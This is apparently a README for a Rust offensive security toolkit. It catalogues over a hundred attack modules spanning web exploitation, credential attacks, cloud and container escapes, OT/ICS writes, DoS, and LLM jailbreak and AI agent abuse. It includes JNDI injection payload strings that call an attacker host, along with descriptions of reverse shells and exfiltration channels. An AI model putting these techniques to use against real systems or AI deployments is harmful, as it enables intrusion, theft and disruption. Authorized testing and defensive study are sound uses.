# PledgeStrike

<p align="center">
____  _     _____ ____   ____ _____   ____ _____ ____  ___ _  _______ 
|  _ \| |   | ____|  _ \ / ___| ____| / ___|_   _|  _ \|_ _| |/ / ____|
| |_) | |   |  _| | | | | |  _|  _|   \___ \ | | | |_) || || ' /|  _|  
|  __/| |___| |___| |_| | |_| | |___   ___) || | |  _ < | || . \| |___ 
|_|   |_____|_____|____/ \____|_____| |____/ |_| |_| \_\___|_|\_\_____|
</p>

An all-in-one offensive security toolkit built in Rust. 110+ independent attack modules with subcommands covering web exploitation, infrastructure testing, credential attacks, AI/LLM abuse, cloud/container attacks, supply chain security, OT/ICS, IoT, network protocols, and payload generation.

## Current Modules

### JWT Attack Module (`jwt`)
- **decode** — Base64 decode header/payload, show claims analysis (exp, iat, nbf, sub, iss, aud, role)
- **check** — Vulnerability scan: alg=none, RSA key confusion, embedded JWK, external key refs, kid injection (path traversal, SQLi), expired/no-expiry
- **crack** — Multi-threaded HS256/HS384/HS512 brute-force with rayon, progress display
- **forge** — Create custom JWT tokens with any secret/payload/algorithm (HS256, HS384, HS512, none), supports `--payload-file`

### SSRF Probe (`ssrf`)
- **payloads** — AWS IMDSv1/v2 (including IPv6), GCP metadata, Azure metadata, internal scan (localhost, 10.x, 192.168.x), protocol smuggling (file://, gopher:// SMTP/Redis, dict://)
- **listen** — HTTP callback listener for blind SSRF detection, logs remote IP, method, path, headers
- **probe** — Injects payloads into `{SSRF}` placeholder in target URL, sends requests, monitors callbacks, auto-detects external IP, reports interesting responses

### Reverse Shell Manager (`shell`)
- **generate** — 11 reverse shell types (bash, python, powershell, netcat, nc_openbsd, node, php, perl, ruby, java, lua) with optional base64 encoding
- **listen** — TCP listener with session management, XOR encryption support, file logging, async I/O, session tracking, command dispatch via mpsc channels

### API Endpoint Enumerator (`api`)
- **enum** — REST endpoint discovery via wordlist path fuzzing with multi-method testing (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS), status code filtering, rate limiting, bearer token/API key/custom headers support
- **fuzz** — Parameter fuzzing — injects test values into query params, compares response against baseline (status, size, content hash), reports behavior changes with severity levels
- **graphql** — GraphQL endpoint discovery — introspection query (dumps schema, types, fields), field suggestion attack via "Did you mean" error messages, batch query DoS detection, query depth limit detection, built-in 53 common field names wordlist
- **auth** — Auth bypass testing — no-auth test, JWT alg=none bypass (forges unsigned token from existing JWT), IDOR testing (increments/decrements numeric IDs in URL), HTTP method confusion (tests POST/PUT/PATCH/DELETE without auth)

### Rate Limit Tester (`ratelimit`)
- **burst** — Send burst requests to a single endpoint to test rate limiting
- **distributed** — Send requests with varying identifiers to simulate distributed rate limit testing
- **report** — Test multiple endpoints and report which ones lack rate limiting

### SSL/TLS Auditor (`tls`)
- **scan** — Scan a single host for TLS vulnerabilities (protocol version, cipher suite, cert analysis, expiry, self-signed, CN mismatch)
- **batch** — Batch scan multiple hosts from a file with concurrent workers
- **report** — Generate compliance-ready reports (Markdown/HTML) from scan results

### Log Parser & IOC Extractor (`ioc`)
- **extract** — Extract IOCs (IPs, hashes, URLs, emails, domains, MACs, CVEs, credit cards, SSNs) from log files with text/JSON/CSV output
- **hunt** — Search for specific IOC patterns in log files with context lines
- **stats** — Extract IOCs and show statistics summary with visual bar charts

### SQLi Injector (`sqli`)
- **error** — Error-based SQLi detection with 17 error payloads matching MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB error patterns
- **blind** — Boolean-based blind SQLi detection comparing response size/content between true (AND 1=1) and false (AND 1=2) conditions
- **time** — Time-based blind SQLi detection using SLEEP, BENCHMARK, pg_sleep, WAITFOR DELAY, and randomblob across MySQL, MSSQL, PostgreSQL, SQLite
- **dump** — UNION-based data extraction with automatic column count detection and schema enumeration via information_schema

### XSS Hunter (`xss`)
- **reflect** — Reflected XSS detection with 16 payloads (script tags, event handlers, SVG, iframe, encoded variants) checking for unescaped reflection
- **store** — Stored XSS detection via POST injection with marker-based persistence verification
- **dom** — DOM-based XSS detection scanning for source-to-sink flows (innerHTML, document.write, eval, location.hash, etc.)
- **blind** — Blind XSS with callback URL for payload delivery to admin panels

### Command Injection (`cmdi`)
- **os** — OS command injection with 16 payloads (;, |, `, $(), &&, ||) checking for uid/root/Linux/Windows markers
- **filter** — Filter bypass with 17 obfuscated payloads (backslash escaping, IFS, variable substitution, cat alternatives)
- **time** — Time-based command injection using sleep/timeout/ping/Start-Sleep with baseline comparison
- **oob** — Out-of-band command injection using curl/wget/nslookup/ping to callback host with exfiltrated data

### XXE Exploiter (`xxe`)
- **file** — XXE file read via external entity with file:// protocol, checks for passwd/win.ini markers
- **ssrf** — XXE-based SSRF using external entity pointing to internal/external URLs
- **blind** — Blind XXE with external DTD fetch to callback host for out-of-band interaction
- **oob** — OOB XXE exfiltration combining file read and DTD-based data exfiltration to callback host

### LFI/RFI Tester (`lfi`)
- **read** — LFI file read with incremental path traversal depth (1-8 levels) and file content marker detection
- **include** — RFI testing with remote URL inclusion, null byte terminator, and query string variants
- **wrapper** — PHP wrapper exploitation (php://filter base64/rot13, data://, expect://, php://input, zip://, phar://)
- **log** — Log poisoning for LFI-to-RCE by injecting payload via User-Agent then including the poisoned log file

### SSRF Chain (`ssrf-chain`)
- **metadata** — Cloud metadata extraction (AWS IMDS, GCP metadata, Azure metadata) with proper headers per cloud provider
- **gopher** — Gopher protocol smuggling targeting Redis, SMTP, FTP, and internal HTTP services
- **blind** — Blind SSRF with callback host for out-of-band interaction detection
- **scan** — Internal port scan via SSRF with configurable port list or common ports preset

### CORS Tester (`cors`)
- **origin** — Origin reflection test with 4 origins (evil.com, attacker.test, localhost, null) checking ACAO/ACAC headers
- **creds** — Credentials test checking if reflected origin includes Access-Control-Allow-Credentials: true
- **wildcard** — Wildcard ACAO test checking if any origin is accepted with *
- **null** — Null origin test exploiting sandboxed iframe null origin bypass

### CRLF Injector (`crlf`)
- **header** — CRLF header injection with 7 payloads (%0d%0a, \r\n) checking for injected headers in response
- **body** — CRLF body injection for double CRLF + script tag injection into response body
- **split** — HTTP response splitting with full fake HTTP response injection via CRLF
- **log** — CRLF log injection for fake log entry creation in server access logs

### Open Redirect (`redirect`)
- **scan** — Open redirect scan testing 20 common redirect parameters (redirect, url, next, return, callback, etc.)
- **bypass** — Filter bypass with 16 encoded payloads (//, \\, @, %23, %00, javascript:, data:)
- **chain** — Chain analysis testing SSRF/XSS/phishing via redirect (metadata endpoints, javascript:, protocol redirects)

### Web Cache Poisoner (`cache`)
- **poison** — Cache poisoning via 13 unkeyed headers (X-Forwarded-Host, X-Host, X-Original-URL, etc.) with reflection check
- **deceive** — Cache deception test appending static file suffixes (.css, .js, .png) to check if HTML is cached
- **key** — Cache key analysis testing unkeyed parameters (utm_source, fbclid, gclid, _ga) with hash comparison

### HTTP Smuggler (`smuggle`)
- **clte** — CL.TE request smuggling with 3 payload variants (basic, with body, prefix injection)
- **tecl** — TE.CL request smuggling with 3 payload variants using Transfer-Encoding: chunked
- **cl0** — CL.0 smuggling with Content-Length: 0 and chunked encoding for header/body injection
- **detect** — Auto-detection testing CL.TE, TE.CL, and CL.0 variants with result summary

### WebSocket Tester (`ws`)
- **fuzz** — WebSocket fuzzing with 10 payload types (long string, null bytes, format string, JSON, SQLi, XSS, cmdi, path traversal, SSTI, XXE)
- **inject** — WebSocket injection with custom payload delivery guidance
- **cswssh** — Cross-Site WebSocket Hijacking test checking origin validation, CSRF tokens, and cookie-based auth
- **auth** — WebSocket auth bypass testing with no auth, fake tokens, empty bearer, null token, and admin bypass

### GraphQL Attacker (`graphql-attack`)
- **introspect** — Full introspection query dumping schema, types, fields, directives with 30-type display limit
- **batch** — Batch query DoS sending N queries in a single request with timing analysis (vulnerable if >5s response)
- **suggest** — Field suggestion attack extracting field names via "Did you mean" error messages with 40-field built-in wordlist
- **depth** — Query depth limit bypass with incremental nesting (1 to max_depth) detecting blocks, slowness, and crashes

### OAuth Abuser (`oauth`)
- **redirect** — Redirect URI manipulation with 10 bypass payloads (path traversal, subdomain, localhost, @, CRLF, null byte, encoded)
- **state** — State parameter validation testing (no state, empty, weak 1-char, predictable, reuse)
- **token** — Token reuse test replaying authorization codes to check if tokens can be re-obtained
- **scope** — Scope escalation requesting elevated scopes (admin, system, wildcard, full access)

### SSTI Exploiter (`ssti`)
- **detect** — SSTI detection with 16 template engine probes (Jinja2, Twig, FreeMarker, Velocity, Smarty, Mako, Handlebars, ERB, Django, etc.)
- **jinja** — Jinja2 RCE via class walk, os.popen, subprocess, lipsum/cycler globals, and __import__
- **twig** — Twig RCE via filter registration, exec filter, app object, file read, and class introspection
- **freemarker** — FreeMarker RCE via Execute, ObjectConstructor, statics, and Jython exec gadget

### Prototype Pollution (`proto`)
- **scan** — Prototype pollution detection with 7 injection variants (__proto__, constructor.prototype, isAdmin, role, toString, hasOwnProperty)
- **gadget** — Gadget chain analysis testing 8 known PP gadgets (EJS, Pug, Express, Handlebars, Dotjs, Lodash, jQuery, Minimatch)
- **exploit** — RCE exploitation via 5 prototype pollution gadget chains (EJS, Pug, Express, Dotjs, Lodash) with custom command

### Race Condition Tester (`race`)
- **race** — Race condition testing sending concurrent requests to exploit TOCTOU vulnerabilities
- **toctou** — Time-of-check-to-time-of-use attack with configurable delay between check and use
- **balance** — Double-spend simulation sending simultaneous withdrawal requests to test transaction integrity
- **coupon** — Coupon/code abuse testing with concurrent redemption attempts

### Host Header Injection (`host`)
- **password** — Password reset poisoning via Host header manipulation to intercept reset links
- **cache** — Cache poisoning via Host header injection causing cached responses with attacker-controlled content
- **access** — Access control bypass using Host header spoofing to reach internal/virtual hosts
- **ssrf** — SSRF via Host header injection targeting internal services and cloud metadata

### Access Control Tester (`acl`)
- **idor** — BOLA/IDOR testing with automatic numeric ID increment/decrement and response diff analysis
- **bfla** — Broken Function Level Access Control testing unauthorized HTTP methods on admin endpoints
- **privilege** — Privilege escalation testing with role swapping and horizontal/vertical access checks
- **path** — Forced browsing / path traversal testing with 40 common admin/internal paths

### Subdomain Takeover (`takeover`)
- **scan** — Scan for dangling DNS CNAMEs pointing to vulnerable services (S3, GitHub, Heroku, Azure, etc.)
- **verify** — Verify takeover vulnerability by checking for service-specific error pages and claim patterns
- **fingerprint** — Fingerprint 20+ cloud provider services for subdomain takeover indicators

### Cloud Exploiter (`cloud`)
- **s3** — AWS S3 bucket enumeration and exploitation (ACL, policy, listing, upload, public read/write)
- **iam** — IAM abuse testing (user enumeration, role assumption, policy analysis, privilege escalation)
- **lambda** — Lambda function injection testing (environment variables, event payload, code injection)
- **metadata** — Cloud metadata extraction (AWS IMDSv1/v2, GCP, Azure) via SSRF or direct access

### Kubernetes Attacker (`k8s`)
- **pods** — Pod enumeration and exploitation (list, exec, create privileged pods, namespace discovery)
- **rbac** — RBAC abuse testing (role discovery, privilege escalation, self-subject access review)
- **secrets** — Secret extraction from Kubernetes API (env vars, mounted secrets, service account tokens)
- **escape** — Container/pod escape techniques (privileged pod, hostPath, hostPID, hostNetwork)

### DNS Rebinding (`rebind`)
- **attack** — DNS rebinding attack simulation with configurable rebinding delay and target switching
- **listen** — DNS listener for rebinding attacks serving attacker-controlled IP responses
- **bypass** — DNS rebinding bypass testing with IP encoding variants (decimal, hex, octal, mixed)

### Password Sprayer (`spray`)
- **spray** — Password spraying against HTTP login forms with user list, configurable delay, and success detection
- **lockout** — Lockout policy detection by sending multiple failed attempts and analyzing response messages
- **policy** — Password policy detection by testing various password complexity and length requirements
- **round** — Round-robin spraying with built-in seasonal/common password list across user list

### Brute Forcer (`brute`)
- **http** — HTTP Basic Auth brute force with async workers, user/pass lists, and concurrent credential testing
- **ssh** — SSH brute force with banner detection and credential testing (requires ssh2/russh for full impl)
- **ftp** — FTP brute force with raw USER/PASS protocol commands and response code analysis
- **form** — HTTP form-based brute force with configurable field names, failure text detection, and async workers

### Payload Generator (`payload`)
- **xss** — Generate 20 XSS payloads (script tags, event handlers, SVG, filter bypasses) with encoded variants
- **sqli** — Generate 20 SQLi payloads categorized by type (auth bypass, UNION, error, time-based, OOB) with encoding
- **cmdi** — Generate 20 command injection payloads with separator×command matrix and encoded variants
- **encode** — Encode any payload with 7 schemes (URL, double-URL, base64, URL-safe base64, hex, unicode, HTML entity)

### Exfiltration Tester (`exfil`)
- **dns** — DNS tunneling exfiltration test with base64 chunking (63-char labels) via Google DNS resolve API
- **icmp** — ICMP exfiltration simulation with payload sizing and ping command generation
- **http** — HTTP exfiltration test across 7 methods (GET/POST/PUT/PATCH with query/body/header/cookie channels)
- **stego** — Steganographic exfiltration via 7 obscure HTTP headers (X-Comment, X-Debug, User-Agent, Referer, etc.)

### Web Fuzzer (`wfuzz`)
- **param** — URL parameter fuzzing with baseline diff analysis (status/size/body change), 50 built-in params
- **header** — HTTP header fuzzing with diff analysis, 30 built-in headers, custom wordlist support
- **body** — POST body parameter fuzzing with diff analysis against baseline response
- **cookie** — Cookie fuzzing with diff analysis, 30 built-in cookie names, custom wordlist support

### Deserialization (`deser`)
- **detect** — Detect insecure deserialization across 6 formats (Java rO0AB/aced, .NET AAEAAAD, PHP O:, Python pickle, Ruby Marshal)
- **java** — Java deserialization exploitation with 7 gadget chains (CommonsCollections, BeanUtils, Groovy, Spring, Jdk7u21)
- **net** — .NET deserialization exploitation with 5 gadget chains (TextFormattingRunProperties, TypeConfuseDelegate, WindowsIdentity, etc.)
- **php** — PHP deserialization exploitation with 6 POP chain variants (__wakeup bypass, __destruct, __toString, __call, PHAR)

### Exploit Runner (`exploit`)
- **search** — Search local exploit database (20 CVEs) by CVE ID, name, category, or description
- **run** — Run exploit against target with implemented templates (Struts2 S2-045, Shellshock, F5 BIG-IP, Webmin)
- **verify** — Non-destructive vulnerability verification for specific CVEs (Struts2, Shellshock, F5, Webmin)
- **chain** — Exploit chaining planner for sequential multi-CVE execution with state passing

### LLM Prompt Injection (`llm`)
- **inject** — Direct prompt injection testing with 15+ payload variants (role override, instruction hijack, delimiter confusion, context manipulation)
- **jailbreak** — LLM jailbreak testing with DAN-style prompts, role-play bypasses, and encoding-based filter evasion
- **leak** — System prompt extraction and data leakage testing via indirect prompts, context probing, and format manipulation
- **hijack** — Conversation hijacking testing with topic redirection, context poisoning, and instruction insertion attacks

### AI Agent Abuse (`agent`)
- **tool** — Tool injection attack testing — manipulates AI agent tool calls via malicious input, parameter injection, and tool name confusion
- **rag** — RAG poisoning attack — tests retrieval-augmented generation by injecting malicious documents into the knowledge base context
- **memory** — Memory manipulation attack — tests persistent memory stores for injection, deletion, and tampering of agent state
- **plugin** — Plugin exploitation — tests AI agent plugin/extension interfaces for unauthorized access, parameter injection, and privilege escalation

### MFA Bypass (`mfa`)
- **fatigue** — MFA fatigue bombing — sends repeated push notifications to overwhelm the user into approving (configurable count/delay)
- **race** — OTP race condition — submits OTP codes concurrently to exploit time-of-check vs time-of-use in validation logic
- **otp** — OTP prediction/guessing — tests 4-6 digit OTP with configurable attempt count and rate limiting
- **fallback** — Fallback bypass — tests if MFA can be bypassed via fallback mechanisms (SMS, email, backup codes, security questions)

### SAML/SSO Abuse (`saml`)
- **xsw** — XML Signature Wrapping (XSW) attack — tests SAML response processing for signature wrapping vulnerabilities (4 XSW variants)
- **response** — SAML response manipulation — tests assertion modification, attribute injection, and audience restriction bypass
- **cert** — Certificate confusion attack — tests SAML response validation with attacker-controlled certificates and self-signed certs
- **assertion** — Assertion forgery — tests for missing signature validation, unsigned assertions, and replay attacks

### WebAuthn/FIDO2 Tester (`webauthn`)
- **origin** — Origin confusion attack — tests Relying Party origin validation with subdomain, port, and scheme variants
- **resident** — Resident key abuse — tests for discoverable credential enumeration and resident key storage vulnerabilities
- **relay** — Relay attack simulation — tests WebAuthn ceremony for relay/proxy attack susceptibility
- **downgrade** — Downgrade attack — tests if WebAuthn can be downgraded to weaker authentication factors (U2F, platform authenticator removal)

### CSP Bypass (`csp`)
- **analyze** — Content Security Policy analysis — fetches and parses CSP headers, reports allowed sources, unsafe-inline, unsafe-eval, wildcard domains
- **bypass** — CSP bypass testing — 10+ bypass techniques (JSONP endpoints, Angular/Vue template injection, CDN abuse, base-uri, strict-dynamic)
- **inline** — Inline script injection — tests if unsafe-inline allows script execution with callback verification
- **exfil** — Data exfiltration via CSP — tests image-src, connect-src, and frame-src for data exfiltration channels with callback

### HTTP/2 Attacker (`h2`)
- **rapidreset** — HTTP/2 Rapid Reset DoS (CVE-2023-44487) — opens and immediately resets streams at high rate to exhaust server resources
- **stream** — Stream abuse — opens excessive concurrent streams to test server concurrency limits and resource exhaustion
- **header** — HPACK header injection — tests compressed header frames for injection and smuggling via HPACK table manipulation
- **priority** — Priority manipulation — sends conflicting stream priority signals to test server scheduling and DoS via CPU exhaustion

### JNDI Injector (`jndi`)
- **ldap** — JNDI LDAP injection — injects `${jndi:ldap://attacker/...}` payloads targeting Log4j-style and Spring-style JNDI lookups
- **rmi** — JNDI RMI injection — injects `${jndi:rmi://attacker/...}` payloads for RMI-based remote class loading exploitation
- **dns** — JNDI DNS injection — injects `${jndi:dns://...}` payloads for DNS-based exfiltration and blind JNDI detection
- **gadget** — Gadget chain delivery — generates and serves serialized gadget chains via LDAP/RMI callback for RCE (CVE-2021-44228 style)

### Container Escape (`container`)
- **docker** — Docker API exploitation — tests exposed Docker daemon API (2375/2376) for container creation, exec, and host access
- **kubelet** — Kubelet API abuse — tests kubelet API (10250/10255) for pod enumeration, exec, and run command access
- **cap** — Linux capabilities abuse — tests for dangerous capabilities (CAP_SYS_ADMIN, CAP_DAC_OVERRIDE, CAP_NET_ADMIN) in container
- **mount** — Host mount exploitation — tests for hostPath mounts, /proc, /sys, and sensitive directory access from within container

### CI/CD Attacker (`cicd`)
- **inject** — Pipeline injection — tests CI/CD pipeline configuration for command injection via build parameters, environment variables, and branch names
- **poison** — Artifact poisoning — tests for dependency/artifact tampering via registry manipulation, cache poisoning, and build output modification
- **runner** — Runner takeover — tests for self-hosted runner abuse, runner registration, and persistent backdoor installation via runner agents
- **webhook** — Webhook exploitation — tests CI/CD webhooks for SSRF, secret extraction, and unauthorized pipeline triggering

### Supply Chain Tester (`supply`)
- **typosquat** — Typosquatting detection — checks package registries (npm, PyPI, crates.io) for typosquatted package names with similarity scoring
- **confusion** — Dependency confusion attack — tests if private package registries fall back to public registries for internal package names
- **poison** — Package poisoning test — checks for install-time script execution, postinstall hooks, and malicious package.json/pyproject.toml entries
- **audit** — Dependency audit — scans lockfiles (package-lock.json, Cargo.lock, requirements.txt) for known vulnerabilities and suspicious packages

### Subdomain Enumerator (`subdom`)
- **brute** — Brute force subdomain enumeration with wordlist, concurrent workers, and wildcard DNS detection
- **ct** — Certificate Transparency log search — queries CT logs (crt.sh, Google CT) for subdomains found in issued certificates
- **passive** — Passive subdomain enumeration — queries search engines, DNS aggregators, and public datasets for subdomain discovery
- **permutate** — Permutation-based subdomain discovery — generates and resolves altered/modified versions of known subdomains

### Secret Hunter (`secret`)
- **js** — JavaScript bundle secret extraction — scans JS/JSX files for API keys, tokens, AWS credentials, private keys with regex patterns
- **repo** — Repository secret scanning — scans Git repos for committed secrets, .env files, config files, and historical commits
- **response** — API response secret detection — checks HTTP responses for leaked secrets in headers, body, and error messages
- **docker** — Docker layer secret extraction — analyzes Docker image layers for secrets in ENV, COPY, and build-time arguments

### Web3/Smart Contract (`web3`)
- **reentrancy** — Reentrancy vulnerability detection — tests smart contracts for reentrancy via external call analysis and state change ordering
- **overflow** — Integer overflow/underflow detection — tests arithmetic operations for SafeMath bypass and unchecked math vulnerabilities
- **access** — Access control testing — tests for missing onlyOwner/modifier checks, unprotected functions, and privilege escalation
- **delegatecall** — Delegatecall abuse — tests for storage collision, context injection, and library exploitation via delegatecall patterns

### WebRTC Exploiter (`webrtc`)
- **leak** — IP leak detection — tests WebRTC STUN/TURN for local and public IP address leakage via ICE candidate gathering
- **stun** — STUN server abuse — tests STUN servers for amplification, reflection, and unauthorized relay usage
- **relay** — TURN relay exploitation — tests TURN servers for unauthorized traffic relay, port allocation, and credential reuse
- **fingerprint** — Browser fingerprinting via WebRTC — extracts device fingerprint data from RTC configuration, codecs, and capabilities

### Git Exposure & Repo Attack (`git`)
- **expose** — .git directory exposure scanner — checks for accessible .git/HEAD, config, index, refs, logs, and objects
- **dump** — Git repository dumper — attempts to reconstruct repo from exposed .git files, extracts HEAD, refs, config, and index
- **hook** — Git hook injection tester — attempts to upload malicious pre-commit, post-commit, pre-push, and other hooks
- **actions** — GitHub Actions exploitation — checks for workflow files with pull_request_target, secret exposure, and injection vectors

### NoSQL Injection (`nosqli`)
- **mongo** — MongoDB injection tester — tests $where, $ne, $gt, $regex, $exists, $or, and $in operators for injection points
- **redis** — Redis Lua script injection — tests EVAL, EVALSHA, and SCRIPT LOAD commands for code execution
- **cassandra** — Cassandra CQL injection — tests single-quote, UNION, batch abuse, ALLOW FILTERING, and UDF injection
- **blind** — Blind NoSQL injection — boolean-based ($ne vs $eq) and time-based ($where sleep) detection

### gRPC Attack (`grpc`)
- **reflect** — gRPC reflection API abuse — queries ServerReflectionInfo to enumerate all services and methods
- **method** — gRPC method enumeration & unauthorized call — tests health checks, admin, internal, and user service methods without auth
- **meta** — gRPC metadata injection — injects authorization, x-forwarded-for, x-user-id, x-role, and x-debug headers
- **stream** — gRPC streaming abuse — opens concurrent streams to test for DoS via stream limit exhaustion

### Kerberos Attack (`kerb`)
- **roast** — Kerberoasting — requests TGS for common SPNs and extracts hashcat-format hashes
- **asrep** — AS-REP roasting — identifies accounts with preauthentication disabled and extracts AS-REP hashes
- **diamond** — Diamond ticket — PAC manipulation via SID history injection, group injection, and encryption downgrade
- **s4u** — S4U2Self/S4U2Proxy — constrained delegation abuse, protocol transition, and resource-based delegation

### LDAP Injection (`ldapi`)
- **filter** — LDAP filter injection — tests wildcard, boolean, and objectClass filter manipulation with error-based detection
- **blind** — Blind LDAP injection — boolean-based (uid=admin vs uid=nonexistent) and time-based (sleep) detection
- **enum** — LDAP enumeration — queries for users, groups, computers, domain admins, service accounts, trusts, sites, and subnets
- **ad** — Active Directory abuse — DCSync check, AS-REP info, SPN/GPO enumeration, ACL abuse, LAPS password read, delegation enum

### postMessage Abuse (`postmsg`)
- **origin** — Origin validation bypass — detects postMessage listeners and tests for wildcard, substring, protocol, and null origin bypasses
- **inject** — postMessage injection — generates XSS, cookie exfil, CSRF, navigation, eval, and storage manipulation payloads
- **fuzz** — Message listener fuzzer — generates string, JSON, array, number, boolean, null, nested, prototype, and large payloads
- **chain** — Cross-frame chaining — detects iframes and parent/top/opener communication patterns for multi-frame attacks

### Service Worker Poisoning (`sw`)
- **register** — Service worker registration abuse — discovers sw.js files and checks for registration in page
- **hijack** — Service worker hijacking — detects importScripts, fetch interception, cache poisoning, and push hijacking vectors
- **persist** — Service worker persistence — checks Service-Worker-Allowed header scope, update mechanism, and persistence vectors
- **fetch** — Fetch interception — detects respondWith, FetchEvent, request cloning, cache match/put, and response crafting

### WebAssembly Exploitation (`wasm`)
- **analyze** — WASM module analyzer — parses binary format, extracts imports/exports, identifies dangerous import functions
- **memory** — WASM memory inspection — detects HEAP access patterns, buffer exports, and memory growth functions
- **import** — Import function abuse — identifies fd_write, fd_read, system, emscripten_run_script, and other dangerous imports
- **reverse** — WASM reverse engineering — enumerates binary sections, code size, and provides tool recommendations

### MQTT/IoT Broker Attack (`mqtt`)
- **connect** — MQTT auth bypass — tests anonymous connection, weak credentials, and TLS port access
- **topic** — Topic wildcard injection — subscribes to #, +, and common wildcard patterns for full data access
- **retain** — Retained message abuse — publishes poisoned config, fake sensor, admin alert, and reboot payloads with retain flag
- **will** — Last Will message injection — sets malicious LWT payloads for post-disconnect exploitation

### OT/ICS/SCADA Attack (`ot`)
- **modbus** — Modbus TCP exploitation — tests read coils/inputs/registers and write coil/register operations (FC 01-10)
- **enum** — OT device enumeration — scans Modbus, Ethernet/IP, DNP3, S7, BACnet, OPC UA, Profinet, and IEC 61850 protocols
- **write** — Register/coil write test — attempts to write to coils and registers to verify write access (caution: affects physical processes)
- **hmi** — HMI web interface scanner — discovers HMI/SCADA web panels and tests default credentials

### Padding Oracle Attack (`padoracle`)
- **detect** — Padding oracle detection — compares server responses for valid vs invalid padding to identify oracle vulnerability
- **decrypt** — Padding oracle decryption — full block-by-block decryption using CBC padding oracle, with PKCS#7 unpadding
- **encrypt** — Padding oracle encryption — crafts arbitrary plaintext into valid ciphertext using bit-flipping technique
- **bit** — CBC bit-flipping attack — flips specific ciphertext bits to modify corresponding plaintext blocks

### SSE Abuse (`sse`)
- **inject** — SSE injection — tests for XSS via data field, event injection, ID injection, and retry manipulation in SSE streams
- **exhaust** — Connection exhaustion — opens persistent SSE connections to test for DoS via connection limit exhaustion
- **exfil** — Data exfiltration — monitors SSE stream for sensitive data (tokens, secrets, passwords, keys) in event data
- **replay** — Event replay attack — manipulates Last-Event-ID header to trigger event replay or injection

### Bluetooth/BLE Recon (`ble`)
- **scan** — BLE device scanner — scans for BLE devices and extracts MAC addresses and device types
- **gatt** — GATT characteristic enumerator — enumerates services and characteristics (Generic Access, Heart Rate, Custom, etc.)
- **write** — Write without response test — attempts unauthenticated writes to characteristics (command, request, long write)
- **mitm** — MITM relay attack — tests pairing methods (Just Works, passkey bypass, OOB bypass, legacy, downgrade)

### NTP Abuse (`ntp`)
- **monlist** — monlist info disclosure — retrieves monitor list leaking internal network addresses
- **amplify** — Amplification test — tests monlist, getmonlist, and peer list modes for DDoS amplification factor
- **time** — Time manipulation — tests time offset injection, step/slew manipulation, and Kiss of Death
- **peek** — Private mode commands — tests read variables, clock variables, peers, config, and set trap operations

### WebDAV Exploitation (`webdav`)
- **methods** — Method enumeration — OPTIONS request to discover WebDAV methods (PROPFIND, COPY, MOVE, PUT, DELETE, etc.)
- **propfind** — PROPFIND directory listing — retrieves full directory listing via WebDAV PROPFIND with allprop
- **upload** — PUT upload test — attempts to upload HTML, ASPX, JSP, PHP, ASP, SHTML, and CGI files for webshell deployment
- **copy** — COPY/MOVE abuse — tests file copying to webroot, config overwrite, and .htaccess injection

### DNS Zone Transfer & Enumeration (`dnsenum`)
- **axfr** — DNS zone transfer (AXFR) tester — tests common nameservers for zone transfer permission
- **records** — DNS record enumeration — queries A, AAAA, MX, TXT, NS, SOA, CNAME, SRV, PTR, CAA records and common subdomains
- **nsec** — NSEC/NSEC3 zone walking — walks DNSSEC NSEC records to enumerate hidden subdomains
- **snoop** — DNS cache snooping — queries resolver non-recursively to identify cached domains

### CSRF Tester (`csrf`)
- **token** — CSRF token bypass — detects tokens, tests removal, empty, static, cross-user, header-based bypass
- **samesite** — SameSite cookie bypass — checks SameSite attribute, tests navigation and iframe bypass vectors
- **json** — JSON CSRF tester — tests content-type confusion with text/plain, multipart, and form-encoded payloads
- **method** — Method-based CSRF — tests GET, HEAD, PUT, DELETE, PATCH for state-changing actions

### Clickjacking Tester (`click`)
- **frame** — X-Frame-Options bypass — checks XFO and CSP frame-ancestors, generates PoC iframe HTML
- **overlay** — Iframe overlay detection — detects CSS overlay patterns and generates PoC overlay techniques
- **pointer** — Pointer event hijacking — detects touch/pointer event handlers and tests interception techniques
- **cursor** — Cursor spoofing — detects custom cursor CSS and tests invisible cursor and offset click techniques

### HTTP Parameter Pollution (`hpp`)
- **detect** — HPP detection — tests duplicate params, array syntax, index syntax, dot notation, and encoded duplicates
- **bypass** — WAF bypass via HPP — tests split SQLi, XSS, traversal, command injection, and SSRF payloads
- **auth** — Auth bypass via HPP — tests role override, userid override, isAdmin override, and debug flag injection
- **logic** — Business logic abuse — tests price, quantity, discount, currency, tax, and shipping parameter overrides

### SMTP/Mail Attack (`smtp`)
- **relay** — SMTP open relay tester — tests direct relay, IP spoof, domain spoof, null sender, percent hack, bang path
- **inject** — SMTP header injection — tests CRLF/LF injection in From, Subject, To, Reply-To fields
- **spf** — SPF/DKIM/DMARC bypass — checks SPF, DMARC, DKIM records and tests bypass vectors
- **command** — SMTP command injection — tests VRFY, EXPN, NOOP, RSET, EHLO overflow, DEBUG, TURN commands

### FTP Server Attack (`ftp`)
- **anon** — FTP anonymous access — tests anonymous login, lists root directory, tests common credentials
- **bounce** — FTP bounce scan — uses FTP server to scan internal targets (SSH, HTTP, MySQL, Redis, etc.)
- **traverse** — FTP directory traversal — tests basic, double-encoded, unicode, null byte, and Windows path traversal
- **backdoor** — FTP backdoor checker — tests vsftpd 2.3.4 backdoor, checks port 6200, lists other FTP backdoors

### SMB/NetBIOS Attack (`smb`)
- **enum** — SMB share enumeration — enumerates shares, checks common shares (C$, D$, ADMIN$, IPC$, etc.)
- **null** — SMB null session — tests null session, enumerates users, groups, shares, policies, sessions, domain info
- **eternal** — EternalBlue (MS17-010) checker — checks vulnerability, lists related SMB CVEs
- **relay** — SMB relay tester — checks SMB signing, SMBv1/v2, NTLM versions, LDAP signing and channel binding

### RDP Attack (`rdp`)
- **enum** — RDP enumeration — extracts OS version, NetBIOS name, NLA support, security protocol, color depth
- **bluekeep** — BlueKeep (CVE-2019-0708) checker — checks vulnerability, lists related RDP CVEs
- **cred** — RDP credential stuffing — tests common credentials with lockout detection
- **nla** — NLA bypass tester — checks NLA requirement, CredSSP version, restricted admin, pass-the-hash support

### SSH Audit (`ssh`)
- **audit** — SSH protocol audit — checks protocol version, algorithms, server banner
- **cipher** — Weak cipher detection — checks for weak ciphers, MACs, and key exchange algorithms
- **enum** — SSH user enumeration — tests user existence via timing differences
- **agent** — SSH agent forwarding — checks agent/X11 forwarding, root login, TCP forwarding, tunnel settings

### SNMP Attack (`snmp`)
- **brute** — SNMP community string brute — tests 30+ common community strings
- **dump** — SNMP information dump — queries system info, interfaces, routing table, ARP cache, TCP connections, processes
- **write** — SNMP write test — tests SET operations on sysContact, sysLocation, sysName
